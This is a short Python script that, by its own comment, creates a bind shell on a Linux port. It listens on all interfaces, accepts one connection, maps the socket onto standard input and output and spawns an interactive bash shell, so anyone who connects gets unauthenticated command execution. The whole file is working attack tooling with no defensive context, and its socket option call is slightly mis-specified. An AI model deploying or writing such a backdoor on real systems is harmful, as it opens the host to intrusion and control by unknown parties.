#!/usr/bin/env python

# This script will create a basic bind shell listening on a Linux port

import socket
import sys
import os
import pty

def main(port):
    try:
        port = int(port)

    except ValueError:
        print ("This does not seem to be a valid number.")
        return
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_IP, socket.SO_REUSEADDR, 1)
    s.bind(("", port))
    s.listen(1)
    (conn, address) = s.accept()

    for x in range(3):
        os.dup2(conn.fileno(), x);

    pty.spawn("/bin/bash")
    s.close()


if __name__ == "__main__":
    try:
        rport = sys.argv[1]
    except:
       	rport = raw_input("What is the port number to listen on? ")
    main(rport)
